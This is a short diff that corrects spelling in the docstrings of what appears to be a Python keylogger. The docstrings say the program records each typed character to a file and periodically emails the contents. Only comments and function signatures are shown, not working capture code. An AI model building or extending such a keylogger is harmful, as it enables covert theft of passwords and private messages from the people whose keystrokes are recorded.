@@ -24,7 +24,7 @@ TIME_BETWEEN_EACH_EMAIL_MSG = 10
 def OnKeyboardEvent(typed_char):
     """
     This method listen for keyboard presses, it gets the char that was typed and write it into a logger file.
-    After a while it reads te file and send an email with the content.
+    After a while it reads the file and send an email with the content.
     :param typed_char:
     :return: True - the keyboard event was caught.
     """
@@ -54,7 +54,7 @@ def passed_enough_time_since_last_email(last_email_sent_time):
 def parse_input_file(file):
     """
     Gets a file with series of chars. after each char there is a \n char.
-    this method tur the seris of chars into words and sentence - make it more visible.
+    this method turn the series of chars into words and sentence - make it more readable.
     :param file:
     :return: parsed file , with sentences and words instead of chars at each line.
     """
